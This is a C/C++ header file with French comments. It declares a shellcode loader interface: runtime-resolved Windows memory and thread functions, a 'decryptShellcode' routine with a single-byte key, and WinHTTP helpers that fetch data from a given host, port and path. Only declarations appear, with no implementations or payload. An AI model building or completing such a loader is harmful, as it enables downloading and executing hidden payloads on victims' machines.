#include <winhttp.h>
#ifndef UTILS_H
#define UTILS_H

// Typedefs pour les fonctions
typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* CreateThread_t)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* VirtualFree_t)(LPVOID, SIZE_T, DWORD);
typedef HANDLE(WINAPI* GetCurrentProcess_t)();

// Structure contenant les pointeurs de fonction
struct ChargeDLL {
    HMODULE hKernel;

    VirtualAlloc_t pVirtualAlloc;
    WriteProcessMemory_t pWriteProcessMemory;
    VirtualProtect_t pVirtualProtect;
    CreateThread_t pCreateThread;
    VirtualFree_t pVirtualFree;
    GetCurrentProcess_t pGetCurrentProcess;
};

// Déclaration des fonctions personnelle 
int chargerLib(ChargeDLL* chargeDLL);

void* allocateMemory(ChargeDLL* dll, size_t size);
BOOL pWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
BOOL protectMemory(ChargeDLL* dll, void* address, size_t size, DWORD newProtect);
HANDLE createThread(ChargeDLL* dll, void* address);
void decryptShellcode(unsigned char* payload, size_t size, unsigned char key);

LPSTR CheckData(HINTERNET hRequest);
LPSTR Data(const wchar_t host[], int port, const wchar_t path[]);
#endif 
